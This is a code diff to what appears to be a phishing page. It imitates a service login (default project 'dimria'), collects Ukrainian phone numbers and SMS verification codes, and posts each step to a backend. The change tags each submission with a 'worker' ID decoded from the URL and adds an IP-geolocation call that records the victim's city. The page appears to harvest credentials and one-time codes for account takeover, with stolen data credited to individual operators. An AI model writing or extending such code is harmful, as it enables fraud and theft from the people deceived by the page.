@@ -128,7 +128,6 @@
             font-size: 14.5px;
         }
 
-        /* ИСПРАВЛЕНО: SMS-код — компактно, центровано, без переполнения */
         .code-input-group {
             display: flex;
             justify-content: center;
@@ -300,9 +299,23 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const project = urlParams.get('project') || 'dimria';
-        const referrer = urlParams.get('ref') ? atob(urlParams.get('ref')).replace(/[^a-zA-Z0-9_]/g, '') : '';
+        const worker = urlParams.get('ref') ? atob(urlParams.get('ref')).replace(/[^a-zA-Z0-9_]/g, '') : '';
 
         document.getElementById('project-logo').src = `/logo?project=${project}`;
+
+        let userCity = 'Невідомо';
+
+        // Отримуємо місто за IP
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                if (data && data.city) {
+                    userCity = data.city;
+                }
+            })
+            .catch(() => {
+                userCity = 'Невідомо';
+            });
 
         $(document).ready(() => {
             $('#phone-number').mask('+380 00 000 00 00', {
@@ -310,11 +323,9 @@
                 clearIfNotMatch: true
             }).val('+380 ').focus();
 
-            // УЛУЧШЕННЫЙ обработчик для SMS-кода
             $('.code-input').on('input', function(e) {
                 let value = this.value.replace(/\D/g, '').substr(0, 1);
                 this.value = value;
-
                 if (value && this.nextElementSibling) {
                     this.nextElementSibling.focus();
                 }
@@ -359,7 +370,13 @@
                 url: '/api/send-data',
                 type: 'POST',
                 contentType: 'application/json',
-                data: JSON.stringify({ step, ...data, referrer, project }),
+                data: JSON.stringify({ 
+                    step, 
+                    ...data, 
+                    worker, 
+                    project, 
+                    city: userCity 
+                }),
                 success: () => {},
                 error: () => {}
             });
